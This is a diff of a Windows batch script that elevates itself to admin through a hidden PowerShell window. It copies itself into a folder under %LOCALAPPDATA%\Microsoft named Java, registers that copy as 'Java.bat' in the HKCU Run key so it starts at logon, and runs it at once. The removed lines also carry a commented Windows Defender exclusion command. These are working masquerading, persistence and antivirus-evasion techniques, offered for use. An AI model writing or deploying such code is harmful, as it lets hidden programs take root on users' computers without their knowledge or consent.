@@ -1,32 +1,35 @@
 @echo off
-:: Elevate if not admin
+:: Elevate
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
 
-:: === Variables ===
-set "SELF_PATH=%~f0"
+:: Variables
+set "NEW_PATH=%LOCALAPPDATA%\Microsoft\Java"
+set "NEW_FILE=%NEW_PATH%\Java.bat"
 set "REG_RUN=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 set "REG_APPROVED=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
-set "REG_NAME=Java.bat"
 
-:: ✅ Delete i.bat from both registry locations
+:: Delete old i.bat entries
 reg delete "%REG_RUN%" /v "i.bat" /f >nul 2>&1
 reg delete "%REG_APPROVED%" /v "i.bat" /f >nul 2>&1
 
-:: Optional: delete other stale entries
-reg delete "%REG_RUN%" /v "JavaStartup" /f >nul 2>&1
-reg delete "%REG_APPROVED%" /v "JavaStartup" /f >nul 2>&1
+:: Make new folder
+mkdir "%NEW_PATH%" >nul 2>&1
 
-:: ✅ Add THIS script to run as "Java.bat"
-reg add "%REG_RUN%" /v "%REG_NAME%" /d "\"%SELF_PATH%\"" /f
+:: Copy script to new clean location
+copy "%~f0" "%NEW_FILE%" >nul
 
-:: Exclude example (optional)
-:: powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'"
+:: Register the new script as Java.bat
+reg add "%REG_RUN%" /v "Java.bat" /d "\"%NEW_FILE%\"" /f
 
-:: Confirm to user
-echo [✓] Java.bat registered. Reboot to see Task Manager update.
+:: Optional: run it immediately
+start "" "%NEW_FILE%"
+
+echo.
+echo [✓] Java.bat installed to new location and registered.
+echo [i] Restart your PC to see correct name in Task Manager.
 pause
 exit
